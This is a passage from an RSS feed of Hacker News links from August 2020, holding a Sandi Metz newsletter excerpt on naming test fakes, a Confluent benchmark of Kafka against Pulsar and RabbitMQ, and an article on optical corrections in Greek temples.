																		<p><em>Meszaros defines <code>Fake</code> as a <code>TestDouble</code> that provides a lightweight implementation of a collaborator that is needed by the class you are actually unit testing. A <code>Fake</code> is a regular old object; no testing magic is involved. In this case the new <code>VerseFake</code> class is a real player of the verse template role; it's called a <code>Fake</code> because it's only used during testing. <code>BottleVerse</code> plays the role of verse template in production. <code>VerseFake</code> was created to play this role during <code>Bottles</code>' unit tests.</em></p>

																		<p><em>The upshot is that <code>Fake</code> is the name of a pattern, so <code>VerseFake</code> violates the don't-include-pattern-names-in-class-names rule.</em></p>

																		<p><em>Rules exist to save money, and the two rules that <code>VerseFake</code> breaks are primarily meant to save money in production code; they might not be so applicable in code created to simplify tests. For example, the purpose of <code>VerseFake</code> is to fake the role of verse template. In this case, <code>VerseFake</code> might be the most intention-revealing name possible. If you end up needing a number of different kinds of fakes, you might need additional qualifiers in their names (<code>SimpleVerseFake</code>, <code>ComplicatedVerseFake</code>) but the word "fake" still adds meaning in the domain of your tests.</em></p>

																		<p><em>Similarly, it's important that the shape of production code not interfere with your ability to change it. The put-domain-behavior-on-instances rule serves this goal. In tests, however, you're less concerned with preserving the fake's changeability and more interested in directly communicating its responsibilities. Putting the behavior in a class or static method simplifies the code in <code>VerseFake</code> at the expense of making it less adaptable. This is a trade-off you'll happily make in code used only by the tests.</em></p>
																		</blockquote>

																		<p>I am convinced by that explanation, and I hope you are too. Now that I comprehend it, the no-pattern-names-in-class-names rule seems both simple and inevitable.</p>

																		<p>The deeper point is that I didn't really understand this rule until I had to write an explanation—believe me, my early attempts were neither brief nor convincing. The above is the result of a few days of walking around in my office, muttering, groping for insight.</p>

																		<p>It's not necessarily bad to cargo-cult a rule. Most rules that have risen to the level of cargo-cult-ability are actually pretty reasonable, and even if you don't completely understand their subtleties, following them might improve your code.</p>

																		<p>However, you'll get more value from a rule if you comprehend its underlying purpose. And even better, understanding its true purpose allows you to justify yourself when you decide to break it.</p>

																		<p>Thanks for reading. I very much hope you are safe and well.</p>

																		<p>Best,</p>

																		<p>Sandi</p>

																		<hr>
																		<h2><a href="https://sender.cloudy.email/postal/click?link=92417&amp;sid=scljtfbdgjegdqjtgyrxa&amp;ck=77-977-977-9B--_ve-_vV7Zjkoz0bs8Re-_vXPvv710VO-_ve-_vWbvv70g77-9eQHvv73vv73vv70=" target="_blank">99 Bottles of OOP, 2nd Edition</a> is complete!</h2>

																		<h3>Use coupon code <strong><a href="https://sender.cloudy.email/postal/click?link=92418&amp;sid=scljtfbdgjegdqjtgyrxa&amp;ck=77-977-9NcibQHDvv73vv70J77-9bwB6OzAk77-9BRjPmgvvv73vv73vv71G77-9Cu-_ve-_ve-_vQ==" target="_blank">2ND-IS-DONE!</a></strong> through Sept 7</h3>

																		<h3>for a <a href="https://sender.cloudy.email/postal/click?link=92418&amp;sid=scljtfbdgjegdqjtgyrxa&amp;ck=77-977-9NcibQHDvv73vv70J77-9bwB6OzAk77-9BRjPmgvvv73vv73vv71G77-9Cu-_ve-_ve-_vQ==" target="_blank">25% discount</a> on the book.</h3>

																		<p>The new edition:</p>

																		<ul>
																			<li>has three new chapters (it's almost 50% longer).</li>
																			<li>comes in separate books for two programming languages (Ruby and JavaScript) and two beverages (beer and milk), with a free PHP upgrade coming this fall.</li>
																			<li>is available as an ebook only, in epub, kepub, kobi, and pdf formats.</li>
																			<li>bundles every book variant. A single purchase gets you all of the books.</li>
																		</ul>

																		<p>I am so <em>glad</em> to be done with this edition that I'm passing that good cheer on to you.</p>

																		<p><strong><em>Note:</em></strong><br>
																		<span><em>Those of you who already own the book should have recently received</em></span><span><em>your own personal upgrade coupon.</em></span></p>

							…</div></td></tr></tbody></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sender.cloudy.email/campaigns/paxjhchaiasjoifsiw/webversion/jdnapfbdgjegdqmdeduwc">https://sender.cloudy.email/campaigns/paxjhchaiasjoifsiw/webversion/jdnapfbdgjegdqmdeduwc</a></em></p>]]>
            </description>
            <link>https://sender.cloudy.email/campaigns/paxjhchaiasjoifsiw/webversion/jdnapfbdgjegdqmdeduwc</link>
            <guid isPermaLink="false">hacker-news-small-sites-24241886</guid>
            <pubDate>Sat, 22 Aug 2020 05:40:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kafka benchmarked against pulsar and rabbitmq]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24241849">thread link</a>) | @pdeva1
<br/>
August 21, 2020 | https://www.confluent.io/blog/kafka-fastest-messaging-system/ | <a href="https://web.archive.org/web/*/https://www.confluent.io/blog/kafka-fastest-messaging-system/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Apache Kafka<sup>®</sup> is one of the most popular event streaming systems. There are many ways to <a href="https://www.confluent.io/kafka-vs-pulsar/">compare systems</a> in this space, but one thing everyone cares about is performance. Kafka has been known to be <a href="https://engineering.linkedin.com/kafka/benchmarking-apache-kafka-2-million-writes-second-three-cheap-machines" target="_blank" rel="noopener noreferrer">fast</a>, but how fast is it today, and how does it stack up against other systems? We decided to test Kafka’s performance on the latest cloud hardware to find out.</p>
<p>For comparisons, we chose a traditional message broker, <a href="https://www.rabbitmq.com/" target="_blank" rel="noopener noreferrer">RabbitMQ</a>, and one of the <a href="https://bookkeeper.apache.org/" target="_blank" rel="noopener noreferrer">Apache BookKeeper™</a>&nbsp;based message brokers, <a href="http://pulsar.apache.org/" target="_blank" rel="noopener noreferrer">Apache Pulsar</a>. We focused on (1) <strong>system throughput</strong> and (2) <strong>system latency</strong>, as these are the primary performance metrics for event streaming systems in production. In particular, the throughput test measures how efficient each system is in utilizing the hardware, specifically the disks and the CPU. The latency test measures how close each system is to delivering real-time messaging including tail latencies of up to p99.9th percentile, a key requirement for real-time and mission-critical applications as well as microservices architectures.</p>
<p>We found that Kafka delivers the best throughput while providing the lowest end-to-end latencies up to the p99.9th percentile. At lower throughputs, RabbitMQ delivers messages at very low latencies.</p>
<p><a href="https://cdn.confluent.io/wp-content/uploads/throughput-and-latency-quantiles.png" rel="noopener noreferrer" target="_blank"><img src="https://cdn.confluent.io/wp-content/uploads/throughput-and-latency-quantiles.png" alt="Throughput (MB/s) | End-to-End Latency Quantiles" width="2541" height="1000" srcset="https://cdn.confluent.io/wp-content/uploads/throughput-and-latency-quantiles.png 2541w, https://cdn.confluent.io/wp-content/uploads/throughput-and-latency-quantiles-300x118.png 300w, https://cdn.confluent.io/wp-content/uploads/throughput-and-latency-quantiles-1024x403.png 1024w, https://cdn.confluent.io/wp-content/uploads/throughput-and-latency-quantiles-768x302.png 768w, https://cdn.confluent.io/wp-content/uploads/throughput-and-latency-quantiles-1536x604.png 1536w, https://cdn.confluent.io/wp-content/uploads/throughput-and-latency-quantiles-2048x806.png 2048w, https://cdn.confluent.io/wp-content/uploads/throughput-and-latency-quantiles-350x138.png 350w, https://cdn.confluent.io/wp-content/uploads/throughput-and-latency-quantiles-600x236.png 600w" sizes="(max-width: 2541px) 100vw, 2541px"></a></p>
<table>
<tbody>
<tr>
<td></td>
<td><strong>Kafka</strong></td>
<td><strong>Pulsar</strong></td>
<td><strong>RabbitMQ</strong><br>
<strong>(Mirrored)</strong></td>
</tr>
<tr>
<td><strong>Peak Throughput</strong><br>
<strong>(MB/s)</strong></td>
<td>605<br>
MB/s</td>
<td>305<br>
MB/s</td>
<td>38<br>
MB/s</td>
</tr>
<tr>
<td><strong>p99 Latency</strong><br>
<strong>(ms)</strong></td>
<td>5 ms<br>
(200 MB/s load)</td>
<td>25 ms<br>
(200 MB/s load)</td>
<td>1 ms*<br>
(reduced 30 MB/s load)</td>
</tr>
</tbody>
</table>
<p><em>*RabbitMQ latencies degrade significantly at throughputs higher than the 30 MB/s. Furthermore, the impact of mirroring is significant at higher throughput and better latencies can be achieved by using just classic queues without mirroring.</em></p>
<p>This blog post is structured to first walk you through the benchmarking framework we used, followed by a description of the testbed and the workloads. It will finish with an explanation of the results using the various system and application metrics. All of these are <a href="https://github.com/confluentinc/openmessaging-benchmark/" target="_blank" rel="noopener noreferrer">open source</a>, so curious readers can reproduce the results for themselves or dig deeper into the collected Prometheus metrics. As with most benchmarks, we compare performance on a setup for a specific workload. We always encourage readers to compare using their own workloads/setups, to understand how these translate to production deployments. For a deeper look at features, architecture, ecosystem, and more, read this <a href="https://www.confluent.io/kafka-vs-pulsar/">complete guide</a> comparing Kafka, Pulsar, and RabbitMQ.</p>
<h2 id="overview"><a id="overview"></a>Overview</h2>
<ul>
<li><a href="#background">Background</a></li>
<li><a href="#durability">Durability in distributed systems</a></li>
<li><a href="#benchmarking-framework">Benchmarking Framework</a>
<ul>
<li><a href="#omb-framework">Fixes to the OMB Framework</a></li>
<li><a href="#omb-kafka-driver">Fixes to the OMB Kafka driver</a></li>
<li><a href="#omb-rabbitmq-driver">Fixes to the OMB RabbitMQ driver</a></li>
<li><a href="#omb-pulsar-driver">Fixes to the OMB Pulsar driver</a></li>
</ul>
</li>
<li><a href="#testbed">Testbed</a>
<ul>
<li><a href="#disks">Disks</a></li>
<li><a href="#os-tuning">OS tuning</a></li>
<li><a href="#memory">Memory</a></li>
</ul>
</li>
<li><a href="#throughput-test">Throughput test</a>
<ul>
<li><a href="#fsync">Effect of fsync</a></li>
<li><a href="#test-setup">Test setup</a></li>
<li><a href="#throughput-results">Throughput results</a></li>
</ul>
</li>
<li><a href="#latency-test">Latency test</a>
<ul>
<li><a href="#latency-results">Latency results</a></li>
<li><a href="#latency-trade-offs">Latency trade-offs</a></li>
</ul>
</li>
<li><a href="#summary">Summary</a></li>
</ul>
<h2 id="background"><a id="background"></a>Background</h2>
<p>First, let’s discuss each of the systems briefly to understand their high-level design and architecture, looking at the trade-offs each system makes.</p>
<p><strong>Kafka</strong> is an open-source distributed event streaming platform, and one of the five most active projects of the Apache Software Foundation. At its core, Kafka is designed as a replicated, distributed, persistent commit log that is used to power event-driven microservices or large-scale stream processing applications. Clients produce or consume events directly to/from a cluster of brokers, which read/write events durably to the underlying file system and also automatically replicate the events synchronously or asynchronously within the cluster for fault tolerance and high availability.</p>
<p><strong>Pulsar</strong> is an open-source distributed pub/sub messaging system originally catered towards queuing use cases. It recently added event streaming functionality as well. Pulsar is designed as a tier of (almost) stateless broker instances that connect to a separate tier of BookKeeper instances, which actually read/write and, optionally, store/replicate the messages durably. Pulsar is not the only system of its kind as there are also other messaging systems like Apache DistributedLog and Pravega, which have been created on top of BookKeeper and aim to also provide some Kafka-like event streaming functionality.</p>
<p><strong>BookKeeper</strong> is an open-source distributed storage service that was originally designed as a write-ahead log for Apache™ Hadoop®’s NameNode. It provides persistent storage of messages in <em>ledgers</em>, across server instances called <em>bookies</em>. Each bookie synchronously writes each message to a local journal log for recovery purposes and then asynchronously into its local indexed ledger storage. Unlike Kafka brokers, bookies do not communicate with each other and it’s the BookKeeper clients that are responsible for replicating the messages across bookies using a quorum-style protocol.</p>
<p><strong>RabbitMQ</strong> is an open-source traditional messaging middleware that implements the AMQP messaging standard, catering to low-latency queuing use cases. RabbitMQ consists of a set of broker processes that host “exchanges” for publishing messages to and queues for consuming messages from. Availability and durability are properties of the various queue types offered. Classic queues offer the least availability guarantees. Classic mirrored queues replicate messages to other brokers and improve availability. Stronger durability is provided through the more recently introduced <a href="https://www.rabbitmq.com/quorum-queues.html" target="_blank" rel="noopener noreferrer">quorum queues</a> but at the <a href="https://www.rabbitmq.com/quorum-queues.html#use-cases" target="_blank" rel="noopener noreferrer">cost of performance</a>. Since this is a performance-oriented blog post, we restricted our evaluation to classic and mirrored queues.</p>
<h2 id="durability"><a id="durability"></a>Durability in distributed systems</h2>
<p>Single-node storage systems (e.g., RDBMS) depend on fsyncing writes to disk to ensure maximal durability. But in distributed systems, durability typically comes from replication, with multiple copies of the data that fail independently. Fsyncing data is just a way of reducing the impact of the failure when it does occur (e.g., fsyncing more often could lead to lower recovery time). Conversely, if enough replicas fail, a distributed system may be unusable regardless of fsync or not. Hence, whether we fsync or not is just a matter of what guarantees each system chooses to depend on for its replication design. While some depend closely on never losing data written to disk, thus requiring fsync on every write, others handle this scenario in their design.</p>
<p>Kafka’s replication protocol was carefully designed to ensure consistency and durability guarantees without the need for synchronous fsync by tracking what has been fsynced to the disk and what hasn’t. By assuming less, Kafka can handle a wider range of failures like filesystem-level corruptions or accidental disk de-provisioning and does not take for granted the correctness of data that is not known to be fsync’d. Kafka is also able to leverage the OS for batching writes to the disk for better performance.</p>
<p>We have not been able to ascertain categorically whether BookKeeper offers the same consistency guarantees without fsyncing each write—specifically, whether it can rely on replication for fault tolerance in the absence of synchronous disk persistence. This isn’t covered in the documentation or a write-up on the underlying replication algorithm. Based on our inspection and the fact that BookKeeper implements a grouped fsync algorithm, we believe it does rely on fsyncing on each write for its correctness, but we’d love to <a href="mailto:info@confluent.io" target="_blank" rel="noopener noreferrer">hear from folks</a> in the community who might know better if our conclusion is correct.</p>
<p>In any case, since this can be somewhat of a controversial topic, we’ve given results in both cases to ensure we are being as fair and complete as possible, though running Kafka with synchronous fsync is extremely uncommon and also unnecessary.</p>
<h2 id="benchmarking-framework"><a id="benchmarking-framework"></a>Benchmarking framework</h2>
<p>With any benchmark, one wonders what framework is being used and if it’s fair. To that end, we wanted to use the <a href="http://openmessaging.cloud/docs/benchmarks/" target="_blank" rel="noopener noreferrer">OpenMessaging Benchmark Framework</a> (OMB), originally authored, in large parts, by Pulsar contributors. OMB was a good starting point with basic workload specification, metrics collection/reporting for the test results, support for the three chosen messaging systems as well as a modular cloud deployment workflow tailored for each system. But of note, Kafka and RabbitMQ implementations did have some significant shortcomings that affected the fairness and reproducibility of these tests. The resulting benchmarking code including the fixes described in more detail below are available as <a href="https://github.com/confluentinc/openmessaging-benchmark" target="_blank" rel="noopener noreferrer">open source</a>.</p>
<h3 id="omb-framework"><a id="omb-framework"></a>Fixes to the OMB Framework</h3>
<p>We upgraded to Java 11 and Kafka 2.6, RabbitMQ 3.8.5, and Pulsar 2.6 (the latest releases at the time of writing). We significantly enhanced the monitoring capabilities across the three systems, with the Grafana/Prometheus monitoring stack, capturing metrics across messaging systems, JVM, Linux, disk, CPU, and network. This was critical for being able to not just report results but explain them. We have added support for producer-only tests and consumer-only tests with support for generating/draining backlogs, while also fixing an important bug with producer rate calculation when the number of topics is smaller than the number of producer workers.</p>
<h3 id="omb-kafka-driver"><a id="omb-kafka-driver"></a>Fixes to the OMB Kafka driver</h3>
<p>We fixed a critical bug in the Kafka driver that starved Kafka producers of TCP connections, bottlenecking on a single connection from each worker instance. The fix makes the Kafka numbers fair, compared to other systems—that is, all of them now use the same number of TCP connections to talk to their respective brokers. We also fixed a critical bug in the Kafka benchmark consumer driver, where offsets were being committed too frequently and synchronously causing degradation, whereas it was done asynchronously for other systems. We also tuned the Kafka consumer fetch size and replication threads to eliminate bottlenecks in message fetching at high throughputs and to configure the brokers equivalent to the other systems.</p>
<h3 id="omb-rabbitmq-driver"><a id="omb-rabbitmq-driver"></a>Fixes to the OMB RabbitMQ driver</h3>
<p>We enhanced RabbitMQ to use routing keys and configurable exchange types (<code>DIRECT</code> and <code>TOPIC</code> exchanges) and also fixed a bug in the RabbitMQ cluster setup deployment workflow. Routing keys were introduced to mimic the concept of partitions per …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.confluent.io/blog/kafka-fastest-messaging-system/">https://www.confluent.io/blog/kafka-fastest-messaging-system/</a></em></p>]]>
            </description>
            <link>https://www.confluent.io/blog/kafka-fastest-messaging-system/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24241849</guid>
            <pubDate>Sat, 22 Aug 2020 05:34:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a startup from $0 to $1 – Day 3: IDEA]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24241747">thread link</a>) | @branzzel
<br/>
August 21, 2020 | https://www.twitch.tv/branzzel | <a href="https://web.archive.org/web/*/https://www.twitch.tv/branzzel">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.twitch.tv/branzzel</link>
            <guid isPermaLink="false">hacker-news-small-sites-24241747</guid>
            <pubDate>Sat, 22 Aug 2020 05:15:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Greek Temples Correct Visual Distortion]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24241634">thread link</a>) | @rahimiali
<br/>
August 21, 2020 | https://www.architecturerevived.com/how-greek-temples-correct-visual-distortion/ | <a href="https://web.archive.org/web/*/https://www.architecturerevived.com/how-greek-temples-correct-visual-distortion/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<table>
<tbody>
<tr>
<td>Ancient Greek architects counteracted the deformity that comes with visual perspective. Objects appear smaller as they are farther away, and as Greek temples were “buildings in which merits and faults usually last forever” <sup id="cite_ref-1"><a title="" href="#cite_note-1">1</a></sup> it was important that all parts be seen in their correct size.An ideal building would be seen as a whole object, with parts that fit perfectly. Unless it displays correct proportions, “there can be no principles in the design of any temple; that is, if there is no precise relation between its members.” <sup id="cite_ref-2"><a title="" href="#cite_note-2">2</a></sup>
<p>Greek and Roman builders sought to “counteract the ocular deception by an adjustment of proportions.” <sup id="cite_ref-3"><a title="" href="#cite_note-3">3</a></sup> Objects farther away were enlarged so that they matched the objects around them. Architects adjusted proportions so that the temple would appear correct when viewed a distance six times the height of a column. This precise viewing distance related the viewer to the architecture and made him part of it.<br>
&nbsp;</p>
<h2><span id="tilt">Tilt to Fix Perspective</span></h2>
<p>&nbsp;<br>
The Roman architect Vitruvius said that all parts above the column of a Doric building should be tilted downward so that they would appear to be vertical when viewed from below. If viewed from afar, these tilted elements would appear flush.</p>
</td><td></td>
<td><a href="https://lh3.googleusercontent.com/-jbdoZG-UVvg/UtWjZH9hPXI/AAAAAAAACTg/-ZotRPiFOKk/s0/5%2520Parthenon.jpg"><img src="https://lh3.googleusercontent.com/-jbdoZG-UVvg/UtWjZH9hPXI/AAAAAAAACTg/-ZotRPiFOKk/s350/5%2520Parthenon.jpg" alt=""></a>

</td>
</tr>
</tbody>
</table>
<p><a href="https://lh6.googleusercontent.com/-jhZ2TnJ6RP8/UtWlm4ohd-I/AAAAAAAACT0/2d-sXGH7ADU/s0/10%2520Tilted%2520for%2520perspective.jpg"><img src="https://lh6.googleusercontent.com/-jhZ2TnJ6RP8/UtWlm4ohd-I/AAAAAAAACT0/2d-sXGH7ADU/s350/10%2520Tilted%2520for%2520perspective.jpg" width="40%" alt=""></a></p>
<blockquote><p>“All the members which are to be above the capitals of the columns, that is, architraves, friezes, coronae, tympana, gables, and acroteria, should be inclined to the front a twelfth part of their own height, for the reason that when we stand in front of them, if two lines are drawn from the eye, one reaching to the bottom of the building and the other to the top, that which reaches to the top will be the longer. Hence, as the line of sight to the upper part is the longer, it makes that part look as if it were leaning back. But when the members are inclined to the front, as described above, they will seem to the beholder to be plumb and perpendicular.” <sup id="cite_ref-4"><a title="" href="#cite_note-4">4</a></sup></p></blockquote>

<h2><span id="distance">View Correctly From A Certain Distance</span></h2>
<p>&nbsp;<br>
Why a tilt of 1/12? The roof eave overhang was usually about 1/12th the height of the column (for example, the Temple of Athena at Priene). This was deliberately the same proportion as the entablature tilt, so that it would relate each element of the entablature with the columns below.</p>
<div><p>If we form an equilateral triangle from the tilt of the columns and overhang, we discover that this plane appears flush to someone standing back six times the height of the columns. This point of the triangle will be at eye height, just the right point from which to view the building. To someone standing at this distance, the roof eave will appear the same distance away as the base of the column.<br>
<a href="https://lh4.googleusercontent.com/-jhVJIBBArwE/UtgO_6W0ndI/AAAAAAAACXY/4KC-I2696S0/s0/Ionic%2520measurements.jpg"><img src="https://lh4.googleusercontent.com/-jhVJIBBArwE/UtgO_6W0ndI/AAAAAAAACXY/4KC-I2696S0/s700/Ionic%2520measurements.jpg" alt=""></a></p><p>
&nbsp;
It also creates an angle of ten degrees. The numbers six and ten, Vitruvius said, are the best numbers to use because they are related to most other numbers.</p></div>
<p>The Parthenon has columns of 10.45m height and the overhang is less than 1m. It will therefore be viewed with perfect proportions at a distance of about 60m or 200ft.</p>
<p>This provided precise points on the surrounding topography that related to the building, engaged the landscape, and makes the viewer an active participant. An important function of these buildings was to relate of the human body with the temple, finding the “calculated proportions that could be applied to the human body and temples alike.” <sup id="cite_ref-6"><a title="" href="#cite_note-6">6</a></sup> “Since nature has designed the human body so that its members are duly proportioned to the frame as a whole, it appears that the ancients had good reason for their rule, that in perfect buildings the different members must be in exact symmetrical relations to the whole general scheme.” <sup id="cite_ref-5"><a title="" href="#cite_note-5">5</a></sup></p>
<p>Temples don’t just reference the viewer’s body and the outlaying topography- it directly interacts with them, giving explanation for the design of the body and finding its place in the natural landscape.<br>
&nbsp;</p>
<h2><span id="incline">Incline Columns Inward</span></h2>
<p>&nbsp;<br>
<a href="https://lh4.googleusercontent.com/-d5OPNxDdIvU/UtWyFAi6RdI/AAAAAAAACUg/zMr9rvraoLo/s0/6%2520Columns%2520inclined%2520inward.jpg"><img src="https://lh4.googleusercontent.com/-d5OPNxDdIvU/UtWyFAi6RdI/AAAAAAAACUg/zMr9rvraoLo/s300/6%2520Columns%2520inclined%2520inward.jpg" width="40%" alt=""></a><br>
The facade elements are tilted outward, but the columns are actually tilted inward. This emphasizes their ability to hold up the ceiling. Vertical columns under the heavy weight of the entablature appear like they are about to tip over toward the viewer, but an inward tilt to the columns make them look more stable when viewed from below. This gives “the whole building an appearance of greater strength.” <sup id="cite_ref-7"><a title="" href="#cite_note-7">7</a></sup></p>
<p>In this case Greek architects did not seek to counteract perspective distortion but to use it to their advantage. This “imposing effect of high relief” suggests structural stability, something more important than strict proportion. This inclination is very subtle; on the Parthenon the columns lean inward just 2 3/8 inches. The tilted axis of these columns converge 1 1/2 miles into the sky. <sup id="cite_ref-7"><a title="" href="#cite_note-7">7</a></sup><br>
&nbsp;</p>
<h2><span id="floor">Curved Floor</span></h2>
<p>&nbsp;<br>
<a href="https://lh4.googleusercontent.com/-_TLkgrTunkY/UtW9BX9Fl-I/AAAAAAAACU4/a9tA2iSq4Gc/s0/7%2520Curved%2520stylobate.jpg"><img src="https://lh4.googleusercontent.com/-_TLkgrTunkY/UtW9BX9Fl-I/AAAAAAAACU4/a9tA2iSq4Gc/s300/7%2520Curved%2520stylobate.jpg" width="40%" alt=""></a>The stylobate floor of the Parthenon is curved upward. A perfectly flat floor would appear to sag inward. The face of the earth is curved and the hill on which the Parthenon stands is curved, therefore viewers instinctively expect a slight curvature to all horizontal planes. Straight edges look off.</p>
<p>“This horizontal curvature actually begins not in the stylobate, but below the stylobate in the foundations. But the curvature is most noticeable in the stylobate, which directly receives the downward thrust of the column drums.” <sup id="cite_ref-8"><a title="" href="#cite_note-8">8</a></sup></p>
<p>The curve reaches 2 3/8 inches on the end facades and 4 5/16 inches on the long facades, a radius of 3 1/2 miles. <sup id="cite_ref-7"><a title="" href="#cite_note-7">7</a></sup><br>
&nbsp;</p>
<h2><span id="spacing">Column Spacing</span></h2>
<p>&nbsp;<br>
<a href="https://lh6.googleusercontent.com/-TXUoPKe8oAw/UtW-znV6pfI/AAAAAAAACVQ/8JL2BpmNiJ4/s0/8%2520Column%2520spacing%2520contracted.jpg"><img src="https://lh6.googleusercontent.com/-TXUoPKe8oAw/UtW-znV6pfI/AAAAAAAACVQ/8JL2BpmNiJ4/s300/8%2520Column%2520spacing%2520contracted.jpg" width="40%" alt=""></a><br>
In perspective, the distance between columns normally appear smaller as they proceed toward a <a href="http://www.architecturerevived.com/how-to-find-vanishing-points-in-perspective-drawing/">vanishing point</a> in the distance. But the Parthenon has more robust columns and greater spacing between them at the ends. When viewed from a distance the spacing and size appear equal.</p>
<p>Along with proportions, this also makes the structure appear more stable. “Hence in the Parthenon, the spacing between each corner column and the column next to it is less than the space between other columns, and this gives a feeling of extra support at points of extra stress.” <sup id="cite_ref-9"><a title="" href="#cite_note-9">9</a></sup><br>
&nbsp;</p>
<h2><span id="entasis">Column Shafts Swell Out</span></h2>
<p>&nbsp;<br>
<a href="https://lh4.googleusercontent.com/-_BsUpQkhkXY/UtXBlCfWXNI/AAAAAAAACVw/QI67iJOJalI/s0/9%2520Column%2520entasis%2520Fra%2520Giocondo%2520vitruvius.jpg"><img src="https://lh4.googleusercontent.com/-_BsUpQkhkXY/UtXBlCfWXNI/AAAAAAAACVw/QI67iJOJalI/s300/9%2520Column%2520entasis%2520Fra%2520Giocondo%2520vitruvius.jpg" width="40%" alt=""></a><br>
The shafts of the columns swell slightly outward. This counteracts a feeling of slenderness that results from visual perspective, much as with the case of the curved floor. A swollen column appears more robust and strong than a straight shaft.</p>
<p>Vitruvius prescribed different “proportionate enlargements” depending on the height of the columns. Taller columns require greater enlargement because perspective causes more distortion on them, he reasons. <sup id="cite_ref-10"><a title="" href="#cite_note-10">10</a></sup><br>
&nbsp;</p>
<h2><span id="goldenmean">Golden Proportion</span></h2>

<p><a href="https://lh3.googleusercontent.com/-UGli92vOf7s/UtXCCyZ2qzI/AAAAAAAACV8/44u7F5HCtzg/s0/4%2520Parthenon%2520measurements%2520golden%2520mean.jpg"><img src="https://lh3.googleusercontent.com/-UGli92vOf7s/UtXCCyZ2qzI/AAAAAAAACV8/44u7F5HCtzg/s0/4%2520Parthenon%2520measurements%2520golden%2520mean.jpg" width="100%" alt=""></a></p>
<p><a href="http://www.architecturerevived.com/golden-ratio-form-size-distance-in-space/">The Golden proportion</a> relates parts of an object. It allows the brain to distinguish size and distances of objects in perspective and thus recognize them as parts of a whole body. It comes as no surprise, therefore, that Greeks and Romans use this proportion extensively.</p>
<p>The increase in distance between the columns follows the golden proportion, so that the gap between columns is proportionate to the width of the column shafts. This proportion of positive and negative space allows the viewer’s brain to recognize the columns as part of the entire edifice, so that “the temple, viewed from a distance, compresses into an all but impenetrable volume that stands out in bold relief against its surroundings.” <sup id="cite_ref-11"><a title="" href="#cite_note-11">11</a></sup></p>
<p>In the Parthenon, the stylobates and metopes follow the same golden proportions as the columns. This gives the collonade a golden proportion of 3 columns versus 4 columns and the entire width of the facade a golden proportion. Golden proportion also dictates the column height versus the entablature, the same relationship of elements behind the outward tilt of the facade. The elements within the entablature, which tilt outward 1/12th all have golden proportions amongst themselves.</p>
<p>The <a href="http://miguelmartindesign.com/blog/wp-content/uploads/2011/01/figure7.jpg">golden mean was utilized</a> together with clever ocular corrections to give a sense of wholeness, relationship of parts. This scene of wholeness was achieved from certain views within the outlaying landscape, relating the viewer to the building and to the overall site. The viewer is thus engaged in the architecture.</p>
<div><p><a href="https://lh3.googleusercontent.com/-m6R3Qy6b5wM/UtXGa8AGT5I/AAAAAAAACWk/SL6iR65_ncE/s0/3%2520Parthenon%2520Frederic%2520Edwin%2520Church.jpg"><img src="https://lh3.googleusercontent.com/-m6R3Qy6b5wM/UtXGa8AGT5I/AAAAAAAACWk/SL6iR65_ncE/s680/3%2520Parthenon%2520Frederic%2520Edwin%2520Church.jpg" alt=""></a></p><p>
&nbsp;
&nbsp;
© Benjamin Blankenbehler 2014</p></div>
<p><u>Citations</u>:</p>
<p id="cite_note-1"><a title="" href="#cite_ref-1">^</a>Vitruvius, Ten Books on Architecture Book III, Chapter 1, v. 4, 1 A.D.</p>
<p id="cite_note-2"><a title="" href="#cite_ref-2">^</a>Vitruvius, Ten Books on Architecture Book III, Chapter 1, v. 1, 1 A.D.</p>
<p id="cite_note-3"><a title="" href="#cite_ref-3">^</a>Vitruvius, Ten Books on Architecture Book III, Chapter 3, v. 11, 1 A.D.</p>
<p id="cite_note-4"><a title="" href="#cite_ref-4">^</a>Vitruvius, Ten Books on Architecture Book III, Chapter 5, v. 13, 1 A.D.</p>
<p id="cite_note-5"><a title="" href="#cite_ref-5">^</a>Vitruvius, Ten Books on Architecture Book III, Chapter 1, v. 1, 4 A.D.</p>
<p id="cite_note-6"><a title="" href="#cite_ref-6">^</a>Ian Jenkins, Greek Architecture and Its Sculpture, Harvard University Press, 2006, p. 27</p>
<p id="cite_note-7"><a title="" href="#cite_ref-7">^</a>William Bell Dinsmoor, The Architecture of Ancient Greece, Biblo &amp; Tannen Publishers, 1950, p. 165</p>
<p id="cite_note-8"><a title="" href="#cite_ref-8">^</a>Vincent J. Bruno, The Parthenon, W. W. Norton &amp; Company, 1974, p. 76</p>
<p id="cite_note-9"><a title="" href="#cite_ref-9">^</a>Thomas Greer &amp; Gavin Lewis, A Brief History of the Western World, Cengage Learning, 2004, p. 91</p>
<p id="cite_note-10"><a title="" href="#cite_ref-10">^</a>see Vitruvius, Ten Books on Architecture Book III, Chapter 3, v. 12, 1 A.D. for exact proportions. Accompanying image by Fra Giocondo.</p>
<p id="cite_note-10"><a title="" href="#cite_ref-10">^</a>Bernard Leupen, Design and Analysis, 010 Publishers, 1997, p. 103</p>
		            	
	</div></div>]]>
            </description>
            <link>https://www.architecturerevived.com/how-greek-temples-correct-visual-distortion/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24241634</guid>
            <pubDate>Sat, 22 Aug 2020 04:50:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stef's Free Online Smalltalk Books]]>
            </title>
            <description>
<![CDATA[
Score 81 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24241561">thread link</a>) | @triyambakam
<br/>
August 21, 2020 | http://stephane.ducasse.free.fr/FreeBooks.html | <a href="https://web.archive.org/web/*/http://stephane.ducasse.free.fr/FreeBooks.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
